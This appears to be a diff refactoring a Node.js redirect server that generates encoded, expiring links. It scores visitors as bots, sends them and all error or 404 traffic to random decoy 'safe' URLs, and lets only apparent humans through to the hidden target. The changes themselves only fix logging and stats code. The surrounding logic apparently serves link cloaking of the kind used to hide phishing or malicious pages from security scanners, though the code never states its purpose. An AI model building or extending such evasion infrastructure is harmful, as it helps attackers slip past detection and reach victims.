@@ -39,7 +39,6 @@ const geoCache  = new NodeCache({ stdTTL: 86400, checkperiod: 3600 }); // 24 hou
 const linkCache = new NodeCache({ stdTTL: LINK_TTL_SEC, checkperiod: 300 });
 const linkRequestCache = new NodeCache({ stdTTL: 60, checkperiod: 10 }); // 1 minute for rate limiting
 const failCache = new NodeCache({ stdTTL: 3600, checkperiod: 600 }); // 1 hour for failed geolocation
-const statsCache = new NodeCache({ stdTTL: 300, checkperiod: 60 }); // 5 minutes for stats
 
 // ─── Stats Tracking ──────────────────────────────────────────────────────────
 const stats = {
@@ -48,14 +47,16 @@ const stats = {
   successfulRedirects: 0,
   expiredLinks: 0,
   generatedLinks: 0,
-  byCountry: new Map(),
-  byBotReason: new Map()
+  byCountry: {},
+  byBotReason: {}
 };
 
 // ─── Middleware ──────────────────────────────────────────────────────────────
 app.use((req, res, next) => {
+  req.id = crypto.randomBytes(8).toString('hex');
   res.locals.nonce = crypto.randomBytes(16).toString('hex');
   res.locals.startTime = Date.now();
+  res.setHeader('X-Request-ID', req.id);
   stats.totalRequests++;
   next();
 });
@@ -82,37 +83,29 @@ app.use(helmet({
 app.use(express.json({ limit: '100kb' }));
 app.use(express.urlencoded({ extended: true, limit: '100kb' }));
 
-// Request ID middleware
-app.use((req, res, next) => {
-  req.id = crypto.randomBytes(8).toString('hex');
-  res.setHeader('X-Request-ID', req.id);
-  next();
-});
-
-// ─── Logging Helper ─────────────────────────────────────────────────────────
-async function logRequest(type, req, extra = {}) {
-  const ip = req.ip || req.headers['x-forwarded-for']?.split(',')[0]?.trim() || '??';
-  const duration = Date.now() - (res.locals?.startTime || Date.now());
-  
-  const logEntry = {
-    timestamp: new Date().toISOString(),
-    requestId: req.id,
-    type,
-    ip,
-    method: req.method,
-    path: req.path,
-    duration,
-    ua: (req.headers['user-agent'] || '').substring(0, 200),
-    ...extra
-  };
-  
+// ─── Logging Helper (FIXED) ─────────────────────────────────────────────────
+async function logRequest(type, req, res, extra = {}) {
   try {
+    const ip = req.ip || req.headers['x-forwarded-for']?.split(',')[0]?.trim() || '??';
+    const duration = res?.locals?.startTime ? Date.now() - res.locals.startTime : 0;
+    
+    const logEntry = {
+      timestamp: new Date().toISOString(),
+      requestId: req.id,
+      type,
+      ip,
+      method: req.method,
+      path: req.path,
+      duration,
+      ua: (req.headers['user-agent'] || '').substring(0, 200),
+      ...extra
+    };
+    
     await fs.appendFile(REQUEST_LOG_FILE, JSON.stringify(logEntry) + '\n');
+    console.log(`[${type}] ${ip} ${req.path} ${JSON.stringify(extra)}`);
   } catch (err) {
-    console.error(`[LOG-ERR] Failed to write log: ${err.message}`);
+    console.error(`[LOG-ERR] ${err.message}`);
   }
-  
-  console.log(`[${type}] ${ip} ${req.path} ${JSON.stringify(extra)}`);
 }
 
 // ─── Health Endpoints ───────────────────────────────────────────────────────
@@ -129,11 +122,11 @@ app.get(['/ping','/health','/healthz','/status'], (req, res) => {
 app.get('/metrics', async (req, res) => {
   const apiKey = req.headers['x-api-key'];
   if (apiKey !== METRICS_API_KEY) {
-    await logRequest('METRICS_UNAUTHORIZED', req);
+    await logRequest('METRICS_UNAUTHORIZED', req, res);
     return res.status(403).json({ error: 'Forbidden' });
   }
 
-  const stats = {
+  const metrics = {
     activeLinks: linkCache.keys().length,
     geoCacheSize: geoCache.keys().length,
     linkRequestCacheSize: linkRequestCache.keys().length,
@@ -157,8 +150,8 @@ app.get('/metrics', async (req, res) => {
     }
   };
   
-  await logRequest('METRICS', req);
-  res.json(stats);
+  await logRequest('METRICS', req, res);
+  res.json(metrics);
 });
 
 // ─── Expired Link Page ──────────────────────────────────────────────────────
@@ -256,7 +249,7 @@ function isLikelyBot(req) {
     reasons.push('suspicious_accept');
   }
   
-  // No referrer for direct access (sometimes normal, but can be suspicious)
+  // No referrer for direct access
   if (!h['referer'] && req.path.startsWith('/v/')) {
     score += 10;
     reasons.push('no_referrer');
@@ -268,7 +261,7 @@ function isLikelyBot(req) {
   if (isBot) {
     stats.botBlocks++;
     reasons.forEach(r => {
-      stats.byBotReason.set(r, (stats.byBotReason.get(r) || 0) + 1);
+      stats.byBotReason[r] = (stats.byBotReason[r] || 0) + 1;
     });
   }
   
@@ -316,10 +309,7 @@ async function getCountryCode(req) {
       
       if (cc && /^[A-Z]{2}$/.test(cc)) {
         geoCache.set(ip, cc);
-        
-        // Update country stats
-        stats.byCountry.set(cc, (stats.byCountry.get(cc) || 0) + 1);
-        
+        stats.byCountry[cc] = (stats.byCountry[cc] || 0) + 1;
         return cc;
       }
     } else {
@@ -332,7 +322,7 @@ async function getCountryCode(req) {
   return 'XX';
 }
 
-// ─── Encoders ────────────────────────────────────────────────────────────────
+// ─── Encoders (Keep all existing encoders) ──────────────────────────────────
 const encoders = [
   { 
     name: 'base64url', 
@@ -456,7 +446,7 @@ app.get('/g', [
 
   const url = `${req.protocol}://${req.get('host')}/v/${id}`;
   
-  logRequest('GENERATE', req, { linkId: id, target: target.substring(0, 60) });
+  logRequest('GENERATE', req, res, { linkId: id, target: target.substring(0, 60) });
   
   res.json({ 
     success: true, 
@@ -500,7 +490,7 @@ app.get('/v/:id', strictLimiter, async (req, res) => {
   const requestCount = linkRequestCache.get(linkKey) || 0;
   
   if (requestCount >= 5) {
-    await logRequest('RATE_LIMIT', req, { linkId, count: requestCount + 1 });
+    await logRequest('RATE_LIMIT', req, res, { linkId, count: requestCount + 1 });
     return res.redirect(BOT_URLS[Math.floor(Math.random() * BOT_URLS.length)]);
   }
   
@@ -508,13 +498,13 @@ app.get('/v/:id', strictLimiter, async (req, res) => {
 
   const country = await getCountryCode(req);
   
-  await logRequest('ACCESS', req, { linkId, country, requestCount: requestCount + 1 });
+  await logRequest('ACCESS', req, res, { linkId, country, requestCount: requestCount + 1 });
 
   // Bot check
   if (isLikelyBot(req)) {
     await fs.appendFile(LOG_FILE, `${new Date().toISOString()} BOT ${ip} ${country}\n`);
     const safe = BOT_URLS[Math.floor(Math.random() * BOT_URLS.length)];
-    await logRequest('BLOCK', req, { linkId, country, reason: 'bot_detected' });
+    await logRequest('BLOCK', req, res, { linkId, country, reason: 'bot_detected' });
     return res.redirect(safe);
   }
 
@@ -524,7 +514,7 @@ app.get('/v/:id', strictLimiter, async (req, res) => {
   const data = linkCache.get(linkId);
   if (!data) {
     stats.expiredLinks++;
-    await logRequest('EXPIRED', req, { linkId, country });
+    await logRequest('EXPIRED', req, res, { linkId, country });
     return res.redirect(`/expired?target=${encodeURIComponent(BOT_URLS[0])}`);
   }
 
@@ -692,14 +682,14 @@ app.get('/v/:id', strictLimiter, async (req, res) => {
 // ─── 404 Handler ─────────────────────────────────────────────────────────────
 app.use((req, res) => {
   const safe = BOT_URLS[Math.floor(Math.random() * BOT_URLS.length)];
-  logRequest('404', req, { redirectTo: safe });
+  logRequest('404', req, res, { redirectTo: safe });
   res.redirect(safe);
 });
 
 // ─── Error Handler ───────────────────────────────────────────────────────────
 app.use((err, req, res, next) => {
   console.error(`[ERROR] ${err.stack}`);
-  logRequest('ERROR', req, { error: err.message });
+  logRequest('ERROR', req, res, { error: err.message });
   
   const safe = BOT_URLS[Math.floor(Math.random() * BOT_URLS.length)];
   res.redirect(safe);
